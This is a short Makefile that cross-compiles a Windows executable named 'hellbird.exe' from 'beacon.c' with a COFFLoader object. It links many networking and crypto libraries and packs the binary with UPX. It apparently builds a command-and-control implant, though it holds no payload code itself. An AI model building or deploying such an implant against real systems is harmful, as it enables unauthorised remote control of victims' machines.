.PHONY: windows clean upx
windows: beacon.c
	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c COFFLoader.o -o hellbird.exe -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -lole32 -loleaut32 -luser32 -lntdll -lpsapi -lnetapi32 -lmpr -lsecur32 -DUNICODE -D_UNICODE -D_CRT_SECURE_NO_WARNINGS  
clean:
	#rm -f hellbird.exe beacon.c
upx:
	upx --best --ultra-brute hellbird.exe
